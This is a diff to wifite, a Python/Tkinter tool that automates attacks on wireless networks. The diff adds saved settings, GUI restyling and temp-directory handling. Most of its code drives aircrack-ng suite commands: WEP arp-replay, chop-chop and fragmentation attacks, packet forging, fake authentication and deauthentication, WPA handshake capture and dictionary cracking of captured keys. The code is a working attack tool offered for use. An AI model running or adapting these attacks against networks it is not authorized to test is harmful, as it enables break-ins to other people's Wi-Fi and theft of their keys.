@@ -7,7 +7,6 @@
 
 """ TODO LIST:
     -test SKA (my router won't allow it, broken SKA everytime)
-	-GUI! BIG. RED. BUTTON. (use Tkinter module)
 """
 
 import string, sys # basic stuff
@@ -24,7 +23,7 @@ import tkFileDialog   # for selecting the dictionary file
 import threading      # so the GUI doesn't lock up
 
 # current revision
-REVISION=13
+REVISION=14
 
 # default wireless interface (blank to prompt)
 # ex: wlan0, wlan1, rausb0
@@ -107,8 +106,17 @@ TEMPDIR=tempfile.mkdtemp(prefix='wifite')
 if not TEMPDIR.endswith('/'):
 	TEMPDIR += '/'
 
+
+
+
+
+
 # GUI needs a root for all children
 root = Tk()
+root.withdraw()  # hide main window until we're ready
+# there was a glitch where a window 'Tk' would appear on ctrl+c.. this fixed it!
+
+
 
 ############################################################ GUI!
 class App:
@@ -116,6 +124,82 @@ class App:
 		the GIU passes arguments to the script
 	"""
 	def __init__(self, master):
+		setenctype='WEP and WPA'
+		setchan   =6
+		setallchan=1
+		setpower  =50
+		setallpow =1
+		setdict   ='/pentest/passwords/wordlists/darkc0de.lst'
+		setwepw   ='10'
+		setwependl=0
+		setwpaw   ='5'
+		setwpaendl=0
+		setpps    =500
+		setarp    =1
+		setchop   =1
+		setfrag   =1
+		setp0841  =1
+		setmac    =0
+		try:
+			f=open('.wifite.conf','r')
+			txt=f.read()
+			lines=txt.split('\n')
+			f.close()
+			for i in xrange(0, len(lines)):
+				l=lines[i].strip()
+				if l == '-nowep':
+					setenctype='WPA'
+				elif l == '-nowpa':
+					setenctype='WEP'
+				elif l == '-c':
+					try:
+						setchan=int(lines[i+1])
+						setallchan=0
+					except ValueError:
+						pass
+					i+=1
+				elif l == '-p':
+					try:
+						setpower=int(lines[i+1])
+						setallpow=0
+					except ValueError:
+						pass
+					i+=1
+				elif l == '-d':
+					setdict=lines[i+1]
+					i+=1
+				elif l == '-wepw':
+					if lines[i+1] == '0':
+						setwependl=1
+					else:
+						setwepw=lines[i+1]
+					i+=1
+				elif l == '-wpaw':
+					if lines[i+1] == '0':
+						setwpaendl=1
+					else:
+						setwpaw=lines[i+1]
+					i+=1
+				elif l == '-pps':
+					try:
+						setpps=int(lines[i+1])
+					except ValueError:
+						pass
+					i+=1
+				elif l == '-noarp':
+					setarp=0
+				elif l == '-nochop':
+					setchop=0
+				elif l == '-nofrag':
+					setfrag=0
+				elif l == '-no0841':
+					setp0841=0
+				elif l == '-mac':
+					setmac=1
+					
+		except IOError:
+			pass
+		
 		f0nt=('FreeSans',9,'bold')
 		frame = Frame(master, width=250, height=150)
 		frame.grid()
@@ -124,8 +208,8 @@ class App:
 		w=Label(frame, font=f0nt, text='interface:')
 		w.grid(row=r, column=0, sticky='E')
 		self.iface = StringVar(frame)
-		lst=self.ifacelist()
-		self.iface.set(lst[0])
+		(lst,default)=self.ifacelist()
+		self.iface.set(default)
 		w=apply(OptionMenu, (frame, self.iface) + tuple(lst))
 		w.config(takefocus=1, width=25, font=f0nt)
 		w.grid(row=r,column=1,columnspan=2, sticky='W')
@@ -135,22 +219,24 @@ class App:
 		w.grid(row=r, column=0, sticky='E')
 		
 		self.enctype = StringVar(frame)
-		self.enctype.set('WEP and WPA')
+		self.enctype.set(setenctype)
 		w=OptionMenu(frame, self.enctype, 'WEP', 'WPA', 'WEP and WPA')
-		w.config(takefocus=1, width=10, font=f0nt)
-		w.grid(row=r,column=1, sticky='W')
+		w.config(takefocus=1, width=15, font=f0nt)
+		w.grid(row=r,column=1, columnspan=2,sticky='W')
 		
 		r+= 1
 		w=Label(frame, text='channel:', font=f0nt)
 		w.grid(row=r,column=0, sticky=E)
 		self.channel=Scale(frame, orient=HORIZONTAL, from_=1, to_=14, resolution=1, length=120, takefocus=1,\
-		 				troughcolor='black', sliderlength=30, sliderrelief=FLAT, relief=FLAT)
+		 				troughcolor='black', sliderlength=30, sliderrelief=FLAT, relief=FLAT, font=f0nt,\
+						activebackground='red')
 		self.channel.grid(row=r, column=1, sticky='W')
-		self.channel.set(6)
-		self.channel.config(state=DISABLED, font=f0nt)
+		self.channel.set(setchan)
 		self.allchan=IntVar(frame)
-		self.allchan.set(1)
-		w=Checkbutton(frame, text='all channels', variable=self.allchan, command=self.click_channel, font=f0nt)
+		self.allchan.set(setallchan)
+		self.click_channel()
+		w=Checkbutton(frame, text='all channels', variable=self.allchan, command=self.click_channel, font=f0nt,\
+							activeforeground='red')
 		w.grid(row=r, column=2, sticky='W')
 		
 		r+= 1
@@ -161,13 +247,15 @@ class App:
 		w=Label(frame, text='minimum power:', font=f0nt)
 		w.grid(row=r,column=0, sticky='E')
 		self.power=Scale(frame, orient=HORIZONTAL, from_=1, to_=100, resolution=1, length=120, takefocus=1,\
-		 				troughcolor='black', sliderlength=20, relief=FLAT, sliderrelief=FLAT, font=f0nt)
+		 				troughcolor='black', sliderlength=20, relief=FLAT, sliderrelief=FLAT, font=f0nt,\
+						activebackground='red')
 		self.power.grid(row=r, column=1, sticky='W')
-		self.power.set(55)
+		self.power.set(setpower)
 		self.power.config(state=DISABLED)
 		self.all=IntVar(frame)
-		self.all.set(1)
-		w=Checkbutton(frame, text='everyone', variable=self.all, command=self.click_power, font=f0nt)
+		self.all.set(setallpow)
+		self.click_power()
+		w=Checkbutton(frame, text='everyone', variable=self.all, command=self.click_power, font=f0nt, activeforeground='red')
 		w.grid(row=r, column=2, sticky='W')
 		
 		r+= 1
@@ -181,8 +269,8 @@ class App:
 		self.dicttxt=Entry(frame, font=f0nt, width=22, textvariable=self.dict)
 		self.dicttxt.grid(row=r, column=1, columnspan=2, sticky='W')
 		self.dicttxt.delete(0, END)
-		self.dicttxt.insert(0, '/pentest/passwords/wordlists/darkc0de.lst')
-		w=Button(frame, text="...", font=('FreeSans',7,''), height=0,command=self.lookup)
+		self.dicttxt.insert(0, setdict)
+		w=Button(frame, text="...", font=('FreeSans',7,''), height=0,command=self.lookup, activebackground='red')
 		w.grid(row=r, column=2, sticky='E')
 		
 		r+= 1
@@ -193,25 +281,29 @@ class App:
 		w=Label(frame, text='wep timeout (min):', font=f0nt)
 		w.grid(row=r,column=0)
 		self.wepw=StringVar(frame)
-		w=Entry(frame, justify=CENTER, width=3, textvariable=self.wepw, font=f0nt)
-		w.grid(row=r, column=1, sticky='W')
-		w.delete(0, END)
-		w.insert(0, '10')
-		self.wepwendless=IntVar(frame)
-		w=Checkbutton(frame, text='endless',variable=self.wepwendless, font=f0nt)
+		self.weptxt=Entry(frame, justify=CENTER, width=3, textvariable=self.wepw, font=f0nt)
+		self.weptxt.grid(row=r, column=1, sticky='W')
+		self.weptxt.delete(0, END)
+		self.weptxt.insert(0, setwepw)
+		self.wepwendless=IntVar(frame, value=setwependl)
+		w=Checkbutton(frame, text='endless',variable=self.wepwendless, font=f0nt, activeforeground='red',\
+					command=self.click_wependless)
 		w.grid(row=r, column=1, sticky='E')
+		self.click_wependless()
 		
 		r+=1
 		w=Label(frame, text='wpa timeout (min):', font=f0nt)
 		w.grid(row=r,column=0)
 		self.wpaw=StringVar(frame)
-		w=Entry(frame, justify=CENTER, width=3, textvariable=self.wpaw, font=f0nt)
-		w.grid(row=r, column=1, sticky='W')
-		w.delete(0, END)
-		w.insert(0, '5')
-		self.wpawendless=IntVar(frame)
-		w=Checkbutton(frame, text='endless',variable=self.wpawendless, font=f0nt)
+		self.wpatxt=Entry(frame, justify=CENTER, width=3, textvariable=self.wpaw, font=f0nt)
+		self.wpatxt.grid(row=r, column=1, sticky='W')
+		self.wpatxt.delete(0, END)
+		self.wpatxt.insert(0, setwpaw)
+		self.wpawendless=IntVar(frame, value=setwpaendl)
+		w=Checkbutton(frame, text='endless',variable=self.wpawendless, font=f0nt, activeforeground='red',\
+					command=self.click_wpaendless)
 		w.grid(row=r, column=1, sticky='E')
+		self.click_wpaendless()
 		
 		r+= 1
 		w=Label(frame, text=' ', font=('',5,''))
@@ -220,37 +312,39 @@ class App:
 		r += 1
 		w=Label(frame, text='wep options:', font=f0nt)
 		w.grid(row=r, column=0, sticky='W')
-		self.weparp=IntVar(value=1)
-		w=Checkbutton(frame, text='arp-replay', variable=self.weparp, font=f0nt)
+		self.weparp=IntVar(value=setarp)
+		w=Checkbutton(frame, text='arp-replay', variable=self.weparp, font=f0nt, activeforeground='red')
 		w.grid(row=r, column=1, sticky='W')
-		self.wepchop=IntVar(value=1)
-		w=Checkbutton(frame, text='chop-chop', variable=self.wepchop, font=f0nt)
+		self.wepchop=IntVar(value=setchop)
+		w=Checkbutton(frame, text='chop-chop', variable=self.wepchop, font=f0nt, activeforeground='red')
 		w.grid(row=r, column=2, sticky='W')
 		r=r+1
-		self.wepfrag=IntVar(value=1)
-		w=Checkbutton(frame, text='fragmentation', variable=self.wepfrag, font=f0nt)
+		self.wepfrag=IntVar(value=setfrag)
+		w=Checkbutton(frame, text='fragmentation', variable=self.wepfrag, font=f0nt, activeforeground='red')
 		w.grid(row=r, column=1, sticky='W')
-		self.wep0841=IntVar(value=1)
-		w=Checkbutton(frame, text='-p 0841', variable=self.wep0841, font=f0nt)
+		self.wep0841=IntVar(value=setp0841)
+		w=Checkbutton(frame, text='-p 0841', variable=self.wep0841, font=f0nt, activeforeground='red')
 		w.grid(row=r, column=2, sticky='W')
-		self.wepmac=IntVar(value=0)
-		w=Checkbutton(frame, text='change mac', variable=self.wepmac, font=f0nt)
+		self.wepmac=IntVar(value=setmac)
+		w=Checkbutton(frame, text='change mac', variable=self.wepmac, font=f0nt, activeforeground='red')
 		w.grid(row=r,column=0, sticky='E')
 		
 		r=r+1
 		w=Label(frame, text='packets/sec:', font=f0nt)
 		w.grid(row=r, column=0)
-		self.weppps=Scale(frame, orient=HORIZONTAL, from_=100, to_=1500, resolution=50, length=190, font=f0nt)
+		self.weppps=Scale(frame, orient=HORIZONTAL, from_=100, to_=1500, resolution=50, length=190, font=f0nt,\
+				troughcolor='gray', activebackground='red', relief=FLAT, sliderrelief=FLAT)
 		self.weppps.grid(row=r, column=0, columnspan=3, sticky='E')
-		self.weppps.set(500)
+		self.weppps.set(setpps)
 		
 		r+= 1
 		w=Label(frame, text=' ', font=('',5,''))
 		w.grid(row=r,columnspan=3)
 		
 		r += 1
-		w = Button(frame, text="HAXOR IT NAO", font=('FreeSans', 20, 'bold'), relief=FLAT, height=2,fg="white", bg="red", \
-				highlightbackground='red', highlightcolor='red', command=self.execute)
+		w = Button(frame, text="  easy  ", font=('FreeSans', 20, 'bold'), relief=FLAT, height=2,fg="white", bg="red", \
+				highlightbackground='white', highlightcolor='red', command=self.execute,activebackground='darkred',\
+				activeforeground='white')
 		w.grid(row=r,columnspan=3)
 		
 		r+=1
@@ -264,16 +358,30 @@ class App:
 		x = sw/2 - w/2
 		y = sh/2 - h/2
 		root.geometry("%dx%d+%d+%d" % (w,h,x,y))
+		root.update()
+		root.deiconify()
+		
+	def click_wpaendless(self):
+		if self.wpawendless.get() == 1:
+			self.wpatxt.config(state=DISABLED)
+		else:
+			self.wpatxt.config(state=NORMAL)
+		
+	def click_wependless(self):
+		if self.wepwendless.get() == 1:
+			self.weptxt.config(state=DISABLED)
+		else:
+			self.weptxt.config(state=NORMAL)
 	
 	def click_channel(self):
 		if self.allchan.get() == 0:
-			self.channel.config(state=NORMAL, troughcolor='red')
+			self.channel.config(state=NORMAL, troughcolor='gray')
 		else:
 			self.channel.config(state=DISABLED, troughcolor='black')
 	
 	def click_power(self):
 		if self.all.get() == 0:
-			self.power.config(state=NORMAL, troughcolor='red')
+			self.power.config(state=NORMAL, troughcolor='gray')
 		else:
 			self.power.config(state=DISABLED, troughcolor='black')
 	
@@ -288,13 +396,32 @@ class App:
 		proc=subprocess.Popen(['airmon-ng'], stdout=subprocess.PIPE)
 		txt=proc.communicate()[0]
 		if txt == '':
-			return []
+			return [],''
 		for line in txt.split('\n'):
 			if line != '' and line.find('Interface') == -1:
 				line = line.replace('\t',' ')
 				lst.append(line.strip())
-		return lst
 		
+		default=''
+		proc=subprocess.Popen(['iwconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+		txt=proc.communicate()[0]
+		if txt == '':
+			if len(lst) > 0:
+				return lst, lst[0]
+			else:
+				return [], 0
+		
+		for line in txt.split('\n'):
+			if line.find('Mode:Monitor') != -1:
+				dev=line[:line.find(' ')].strip()
+				for x in lst:
+					if dev == x[:x.find(' ')].strip():
+						default=x
+						break
+			if default != '':
+				break
+		
+		return lst, default
 	def execute(self):
 		global root
 		
@@ -358,17 +485,26 @@ class App:
 		cmd.append('-pps')
 		cmd.append(str(self.weppps.get()))
 		
+		# save settings
+		f=open('.wifite.conf','w')
+		f.write(str('\n'.join(cmd)))
+		f.close()
+		
 		t=threading.Thread(target=self.doit, args=(cmd,))
 		t.start()
 		root.destroy()
 		#print '[+] exiting...'
+		sys.exit(0)
 	
 	def doit(self, args):
-		cmd=['xterm','-geom','100x30+0+0','-hold','-e','python',THEFILE]
+		cmd=['xterm','-T','WiFite','-geom','100x30+0+0','-hold','-e','python',THEFILE]
 		for a in args:
 			cmd.append(a)
-		#print '[+] executing: ' + ' '.join(cmd)
-		subprocess.call(cmd)
+		print GR+'[+] '+G+'executing: '+W+ './' + THEFILE+' ' + ' '.join(args)
+		try:
+			subprocess.call(cmd)
+		except AttributeError:
+			pass
 
 
 
@@ -535,6 +671,8 @@ def main():
 			app
 			
 			root.mainloop()
+			
+			root = None
 			#print GR+'[+] '+W+'include '+G+'-help'+W+' for more options\n'
 			#time.sleep(1)
 			sys.exit(0)
@@ -626,7 +764,9 @@ def main():
 		
 	except KeyboardInterrupt:
 		print GR+'\n[!] '+O+'^C interrupt received, '+R+'exiting'+W
-		
+	
+	subprocess.call(['rm','-rf',TEMPDIR])
+	subprocess.call('rm -rf /tmp/wifite*', shell=True)
 
 ############################################################################### banner
 def banner():
@@ -836,6 +976,9 @@ def handle_args(args):
 			update()
 			sys.exit(0)
 		
+		elif a == '-console' or a == '--console':
+			print GR+'[+] '+G+'console mode'+W+' activated'
+		
 		i += 1
 		
 	if WEP==False and WPA==False:
@@ -864,6 +1007,7 @@ def halp(full=False):
 	
 	if not full:
 		print G+'  -help    '+GR+'display the full help screen\n'
+		print G+'  -console '+GR+'console/interactive mode (non-GUI)\n'
 		print G+'  -upgrade '+GR+'download/install latest revision\n'
 	else:
 		print G+'  -upgrade\t '+GR+'download/install latest revision\n'
@@ -1124,15 +1268,15 @@ def wpa_crack(index):
 	START_TIME=time.time()
 	
 	try:
-		subprocess.call(['rm','-rf','wpakey.txt','crackout.tmp'])
+		subprocess.call(['rm','-rf',TEMPDIR+'wpakey.txt',TEMPDIR+'crackout.tmp'])
 		time.sleep(0.1)
 		
-		cmd = 'aircrack-ng -a 2 -w '+DICT+' -l wpakey.txt '+filename+' >> crackout.tmp'
+		cmd = 'aircrack-ng -a 2 -w '+DICT+' -l '+TEMPDIR+'wpakey.txt '+filename+' >> '+TEMPDIR+'crackout.tmp'
 		proc_crack = subprocess.Popen(cmd, stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'), shell=True)
 		while (proc_crack.poll() == None):
 			time.sleep(1)
 			print '\r'+GR+'['+sec2hms(time.time() - START_TIME)+'] '+W+'cracking;',
-			f=open('crackout.tmp')
+			f=open(TEMPDIR+'crackout.tmp')
 			txt=f.read()
 			if txt != '' and txt != None:
 				ks=''
@@ -1167,10 +1311,10 @@ def wpa_crack(index):
 			sys.stdout.flush()
 			
 			# wipe the aircrack output file (keep it from getting too big)
-			subprocess.call('echo "" > crackout.tmp',shell=True)
+			subprocess.call('echo "" > '+TEMPDIR+'crackout.tmp',shell=True)
 			
-		if os.path.exists('wpakey.txt'):
-			f = open('wpakey.txt','r')
+		if os.path.exists(TEMPDIR+'wpakey.txt'):
+			f = open(TEMPDIR+'wpakey.txt','r')
 			cracked=f.readlines()[0]
 			print '\n'+GR+'['+sec2hms(time.time()-START_TIME)+'] '+G+'cracked "' + ssid + '"! the key is: "'+C+cracked+G+'"'
 			logit('cracked "' + ssid + '"! the key is "' + cracked + '"')
@@ -1194,7 +1338,7 @@ def wpa_crack(index):
 	subprocess.call(['killall','aircrack-ng'], stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
 	
 	# remove the temp file
-	subprocess.call(['rm','-rf','crackout.tmp'])
+	subprocess.call(['rm','-rf',TEMPDIR+'crackout.tmp'])
 
 ############################################################################### dict_check
 def dict_check():
@@ -1286,16 +1430,17 @@ def attack_wep_all(index):
 	client=CLIENTS.get(TARGETS[index][0], THIS_MAC)
 	
 	# kill all backup IVS files... just in case
-	subprocess.call('rm -rf wep-*.ivs', shell=True)
+	subprocess.call('rm -rf '+TEMPDIR+'wep-*.ivs', shell=True)
 	#subprocess.call('rm -rf wep-*.cap', shell=True)
 	
 	# delete airodump log files
-	subprocess.call(['rm','-rf','wep-01.cap','wep-01.csv','wep-01.kismet.csv','wep-01.kismet.netxml','wep-01.ivs'])
-	subprocess.call(['rm','-rf','wepkey.txt'])
+	subprocess.call(['rm','-rf',TEMPDIR+'wep-01.cap',TEMPDIR+'wep-01.csv',TEMPDIR+'wep-01.kismet.csv',\
+					TEMPDIR+'wep-01.kismet.netxml',TEMPDIR+'wep-01.ivs'])
+	subprocess.call(['rm','-rf',TEMPDIR+'wepkey.txt'])
 	time.sleep(0.1)
 	
 	# open airodump to capture packets
-	cmd = ['airodump-ng','-w','wep','-c',TARGETS[index][1], '--bssid',TARGETS[index][0], \
+	cmd = ['airodump-ng','-w',TEMPDIR+'wep','-c',TARGETS[index][1], '--bssid',TARGETS[index][0], \
 			'--output-format','csv,ivs',IFACE]
 	proc_read = subprocess.Popen(cmd, stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
 	
@@ -1344,12 +1489,14 @@ def attack_wep_all(index):
 			time.sleep(0.3)
 			
 			# delete airodump log files
-			subprocess.call(['rm','-rf','wep-01.cap','wep-01.csv','wep-01.kismet.csv','wep-01.kismet.netxml','wep-01.ivs'])
-			subprocess.call(['rm','-rf','wepkey.txt'])
+			subprocess.call(['rm','-rf',TEMPDIR+'wep-01.cap',TEMPDIR+'wep-01.csv',TEMPDIR+'wep-01.kismet.csv',\
+					TEMPDIR+'wep-01.kismet.netxml',TEMPDIR+'wep-01.ivs'])
+			subprocess.call(['rm','-rf',TEMPDIR+'wepkey.txt'])
 			time.sleep(0.1)
 			
 			# start airodump again!
-			cmd = ['airodump-ng','-w','wep','-c',TARGETS[index][1],'--bssid',TARGETS[index][0],'--output-format','csv,ivs',IFACE]
+			cmd = ['airodump-ng','-w',TEMPDIR+'wep','-c',TARGETS[index][1],'--bssid',TARGETS[index][0],\
+					'--output-format','csv,ivs',IFACE]
 			proc_read = subprocess.Popen(cmd, stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
 			time.sleep(0.3)
 			
@@ -1401,12 +1548,13 @@ def attack_wep_all(index):
 			if typed=='c':
 				# start airodump and do nothing (the rest will start)
 				# delete airodump log files
-				subprocess.call(['rm','-rf','wep-01.cap','wep-01.csv','wep-01.kismet.csv','wep-01.kismet.netxml','wep-01.ivs'])
-				subprocess.call(['rm','-rf','wepkey.txt'])
+				subprocess.call(['rm','-rf',TEMPDIR+'wep-01.cap',TEMPDIR+'wep-01.csv',TEMPDIR+'wep-01.kismet.csv',\
+						TEMPDIR+'wep-01.kismet.netxml',TEMPDIR+'wep-01.ivs'])
+				subprocess.call(['rm','-rf',TEMPDIR+'wepkey.txt'])
 				time.sleep(0.1)
 				
 				# start airodump again!
-				cmd = ['airodump-ng','-w','wep','-c',TARGETS[index][1],'--bssid',TARGETS[index][0], \
+				cmd = ['airodump-ng','-w',TEMPDIR+'wep','-c',TARGETS[index][1],'--bssid',TARGETS[index][0], \
 						'--output-format','csv,ivs',IFACE]
 				proc_read = subprocess.Popen(cmd, stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
 				time.sleep(0.3)
@@ -1444,7 +1592,7 @@ def attack_wep_all(index):
 			
 			# remove any .xor and replay files
 			subprocess.call('rm -rf replay_arp-*.cap *.xor',shell=True)
-			time.sleep(0.1)
+			time.sleep(0.3)
 			
 			if wepnum==0:
 				cmd=['aireplay-ng','-3','-b',TARGETS[index][0],'-h',client,'-x',str(WEP_PPS),IFACE]
@@ -1454,7 +1602,6 @@ def attack_wep_all(index):
 				cmd=['aireplay-ng','-5','-b',TARGETS[index][0],'-h',client,'-m','100','-F','-x',str(WEP_PPS),IFACE]
 			elif wepnum==3:
 				cmd=['aireplay-ng','-2','-b',TARGETS[index][0],'-h',client,'-T','1','-F','-p','0841',IFACE]
-			
 			proc_replay = subprocess.Popen(cmd, stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
 			
 			# chopchop and frag both require replaying the arp packet, this flag lets us know when
@@ -1484,14 +1631,14 @@ def attack_wep_all(index):
 							xor_file=xor_file.split('\n')[0]
 							
 							# remove arp.cap, so we don't have over-write issues
-							subprocess.call(['rm','-rf','arp.cap'])
+							subprocess.call(['rm','-rf',TEMPDIR+'arp.cap'])
 							time.sleep(0.1)
 							
 							print GR+'\n['+get_time(WEP_MAXWAIT,TIME_START)+ \
 									   '] '+G+'produced keystream, '+O+'forging with packetforge-ng...'
 							
 							cmd=['packetforge-ng','-0','-a',TARGETS[index][0],'-h',client,\
-								'-k','192.168.1.2','-l','192.168.1.100','-y',xor_file,'-w','arp.cap',IFACE]
+								'-k','192.168.1.2','-l','192.168.1.100','-y',xor_file,'-w',TEMPDIR+'arp.cap',IFACE]
 							
 							proc_replay = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=open(os.devnull, 'w'))
 							proc_replay.wait()
@@ -1507,7 +1654,7 @@ def attack_wep_all(index):
 								
 								print GR+'['+get_time(WEP_MAXWAIT,TIME_START)+'] '+G+'replaying keystream with arp-replay...'
 								
-								cmd=['aireplay-ng','-2','-r','arp.cap','-F',IFACE]
+								cmd=['aireplay-ng','-2','-r',TEMPDIR+'arp.cap','-F',IFACE]
 								proc_replay = subprocess.Popen(cmd,stdout=open(os.devnull,'w'),stderr=open(os.devnull,'w'))
 								replaying=True
 							else:
@@ -1518,7 +1665,7 @@ def attack_wep_all(index):
 						# attack is still going strong
 						pass
 					
-					ivs=get_ivs('wep-01.csv')
+					ivs=get_ivs(TEMPDIR+'wep-01.csv')
 					if ivs==-1:
 						ivs=0
 					ivs += total_ivs # in case we got IVS from another attack
@@ -1531,17 +1678,18 @@ def attack_wep_all(index):
 								str(AUTOCRACK)+' ivs'+W+')                                       '
 						
 						# remove the wep key output file, so we don't get a false-positive
-						subprocess.call(['rm','-rf','wepkey.txt'],stdout=open(os.devnull,'w'), stderr=open(os.devnull, 'w'))
+						subprocess.call(['rm','-rf',TEMPDIR+'wepkey.txt'],stdout=open(os.devnull,'w'),\
+										 stderr=open(os.devnull, 'w'))
 						time.sleep(0.1)
 						
-						cmd='aircrack-ng -a 1 -l wepkey.txt wep-*.ivs'
+						cmd='aircrack-ng -a 1 -l '+TEMPDIR+'wepkey.txt '+TEMPDIR+'wep-*.ivs'
 						proc_crack = subprocess.Popen(cmd,shell=True,stdout=open(os.devnull,'w'),stderr=open(os.devnull,'w'))
 					
 					# check if we've cracked it
-					if os.path.exists('wepkey.txt'):
+					if os.path.exists(TEMPDIR+'wepkey.txt'):
 						stop_attack=True
 						try:
-							f = open('wepkey.txt', 'r')
+							f = open(TEMPDIR+'wepkey.txt', 'r')
 							pw = f.readlines()[0].strip()
 							f.close()
 						except IOError:
@@ -1562,12 +1710,8 @@ def attack_wep_all(index):
 					if started_crack==True and proc_crack.poll() != None:
 						# we were cracking, but it stopped...
 						#print '\r'+GR+'[+] '+O+'cracking stopped, for some reason; '+W+'restarting...                                '
-						cmd='aircrack-ng -a 1 -l wepkey.txt wep-*.ivs'
+						cmd='aircrack-ng -a 1 -l '+TEMPDIR+'wepkey.txt '+TEMPDIR+'wep-*.ivs'
 						proc_crack = subprocess.Popen(cmd,shell=True,stdout=open(os.devnull,'w'),stderr=open(os.devnull,'w'))
-					
-					# only print if we have new IVS captured
-					#if ivs > oldivs:
-					# output for the user
 					
 					print '\r'+GR+'['+get_time(WEP_MAXWAIT,TIME_START)+ \
 							'] '+W+wepname[wepnum]+' attack on "'+G+TARGETS[index][8]+W+'"',
@@ -1575,13 +1719,14 @@ def attack_wep_all(index):
 					ivsps = (ivs-oldivs) / 5
 					print '('+G+str(ivsps)+W+'/sec)',
 					
-					if replaying:
-						print 'replaying...',
-						
+					
 					if started_crack:
 						print 'cracking...     ',
+					elif replaying:
+						print 'replaying...    ',
+						
 					else:
-						print '                 ',
+						print '                ',
 					sys.stdout.flush()
 					oldivs=ivs
 					
@@ -1673,26 +1818,28 @@ def attack_wep_all(index):
 							
 							# back up the old IVS file
 							backup=2
-							while os.path.exists('wep-0' + str(backup) + '.ivs'):
+							while os.path.exists(TEMPDIR+'wep-0' + str(backup) + '.ivs'):
 								backup += 1
-							subprocess.call('cp wep-01.ivs wep-0' + str(backup) + '.ivs', shell=True)
+							subprocess.call('cp '+TEMPDIR+'wep-01.ivs '+TEMPDIR+'wep-0' + str(backup) + '.ivs', shell=True)
 							time.sleep(0.1) # grace period
 							
 							# delete old files
-							subprocess.call(['rm','-rf','wep-01.cap','wep-01.csv','wep-01.ivs','wep-01.kismet.csv','wep-01.kismet.netxml'])
+							subprocess.call(['rm','-rf',TEMPDIR+'wep-01.cap',TEMPDIR+'wep-01.csv',TEMPDIR+'wep-01.ivs',\
+								TEMPDIR+'wep-01.kismet.csv',TEMPDIR+'wep-01.kismet.netxml'])
 							time.sleep(0.1) # grace period
 							
 							# start the airodump process again
-							cmd = ['airodump-ng','-w','wep','-c',TARGETS[index][1],'--bssid',TARGETS[index][0],\
+							cmd = ['airodump-ng','-w',TEMPDIR+'wep','-c',TARGETS[index][1],'--bssid',TARGETS[index][0],\
 									'--output-format','csv,ivs',IFACE]
 							proc_read = subprocess.Popen(cmd, stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
 							
 							if started_crack: # we already started cracking, have to continue!
 								# remove the wep key output file, so we don't get a false-positive
-								subprocess.call(['rm','-rf','wepkey.txt'],stdout=open(os.devnull,'w'),stderr=open(os.devnull, 'w'))
+								subprocess.call(['rm','-rf',TEMPDIR+'wepkey.txt'],stdout=open(os.devnull,'w'),\
+												stderr=open(os.devnull, 'w'))
 								time.sleep(0.3)
 								# start aircrack
-								cmd='aircrack-ng -a 1 -l wepkey.txt wep-*.ivs'
+								cmd='aircrack-ng -a 1 -l '+TEMPDIR+'wepkey.txt '+TEMPDIR+'wep-*.ivs'
 								
 								proc_crack = subprocess.Popen(cmd,shell=True,stdout=open(os.devnull,'w'),stderr=open(os.devnull,'w'))
 								
@@ -1716,6 +1863,15 @@ def attack_wep_all(index):
 						stop_attack=True
 					
 					break
+					
+				if WEP_MAXWAIT != 0 and (time.time() - TIME_START) >= WEP_MAXWAIT:
+					wcount=0 # count number of methods remaining
+					for i in xrange(wepnum+1,len(weps)):
+						if weps[wepnum] == True:
+							wcount += 1
+							break
+					if wcount > 0:
+						print '\n'+R+'[+] '+wepname[wepnum]+' attack ran out of time',
 			# end of while loop
 			print W
 			
@@ -1734,10 +1890,11 @@ def attack_wep_all(index):
 				pass
 			
 			# remove those pesky .xor and .cap files
-			subprocess.call('rm -rf arp.cap replay_*.cap *.xor',shell=True)
+			subprocess.call('rm -rf '+TEMPDIR+'arp.cap replay_*.cap *.xor',shell=True)
 			
 			if stop_attack:
 				break # break out of for-loop for each method
+			
 		
 		# end of if statement (checks if we're using the current attack method)
 	# end of for-loop through every method
@@ -1760,9 +1917,10 @@ def attack_wep_all(index):
 		pass
 	
 	# clean up airodump
-	subprocess.call(['rm','-rf','wep-01.cap','wep-01.csv','wep-01.kismet.csv','wep-01.kismet.netxml','wep-01.ivs'])
-	subprocess.call('rm -rf wep-*.ivs', shell=True)
-	#subprocess.call('rm -rf wep-*.cap', shell=True)
+	subprocess.call(['rm','-rf',TEMPDIR+'wep-01.cap',TEMPDIR+'wep-01.csv',TEMPDIR+'wep-01.kismet.csv',\
+					TEMPDIR+'wep-01.kismet.netxml',TEMPDIR+'wep-01.ivs'])
+	subprocess.call('rm -rf '+TEMPDIR+'wep-*.ivs', shell=True)
+	#subprocess.call('rm -rf '+TEMPDIR+'wep-*.cap', shell=True)
 	
 	# change mac back
 	if OLD_MAC != '':
@@ -1870,7 +2028,7 @@ def attack_fakeauth(index):
 		
 		faked=False
 		
-		cmd='aireplay-ng -1 1 -a '+TARGETS[index][0]+' -T 2 '+IFACE+' > temp.txt'
+		cmd='aireplay-ng -1 1 -a '+TARGETS[index][0]+' -T 2 '+IFACE+' > '+TEMPDIR+'temp.txt'
 		proc_auth = subprocess.Popen(cmd,shell=True)
 		
 		# we need to loop until we get a .xor file, then fake-auth using the .xor file, and boom we're done
@@ -1906,13 +2064,13 @@ def attack_fakeauth(index):
 			# aireplay has finished
 			elif proc_auth.poll() != None:
 				# check output file for aireplay...
-				tempfile= open('temp.txt')
+				tempfile= open(TEMPDIR+'temp.txt')
 				temptxt = tempfile.read()
 				if temptxt.lower().find('challenge failure') != -1:
 					faked=False
 				else: #if temptxt.lower().find('association successful') != -1:
 					faked=True
-				subprocess.call(['rm','-rf','temp.txt'])
+				subprocess.call(['rm','-rf',TEMPDIR+'temp.txt'])
 				break
 			
 			print GR+'['+get_time(AUTH_MAXWAIT, START_TIME)+'] '+W+'sent deauth; listening for client to reconnect...'
@@ -1963,10 +2121,11 @@ def attack_wpa(index):
 	
 	# logit('started WPA handshake capture for "' + TARGETS[index][8] + '"')
 	try:
-		subprocess.call(['rm','-rf','wpa-01.cap','wpa-01.csv','wpa-01.kismet.csv','wpa-01.kismet.netxml'])
